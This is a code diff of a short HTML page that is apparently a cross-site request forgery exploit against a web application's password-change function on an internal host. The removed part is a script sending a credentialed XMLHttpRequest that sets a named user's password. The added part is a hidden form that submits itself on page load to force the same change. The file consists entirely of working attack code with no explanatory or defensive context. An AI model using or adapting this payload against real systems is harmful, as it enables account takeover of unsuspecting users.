@@ -1,21 +1,13 @@
 <html>
 	<body>	
-	<script> 
-		var xhr = new XMLHttpRequest();
-		xhr.open("POST", 'http://10.3.4.55/ui/ajax/doOp.aspx?mode=userprofile&action=changepassword', false);
-		xhr.withCredentials=true;
-		//Send the proper header information along with the request
-		//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-// 		xhr.onreadystatechange = () => { // Call a function when the state changes.
-// 		  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-// 		    // Request finished. Do processing here.
-// 		  }
-// 		}
-		xhr.send("userID=WMorgan&newpassword1=newp2&newpassword2=newp2");
-		// xhr.send(new Int8Array());
-		// xhr.send(document);
-
-	 </script>
+		
+			
+		<form action="http://10.3.4.55/ui/changepass.aspx" method="POST">
+		    <input type="hidden" name="newpassword1" value="newp2" />
+			<input type="hidden" name="newpassword2" value="newp2" />
+		</form>
+		<script>
+		    document.forms[0].submit();
+        	</script>
     </body>
 </html>
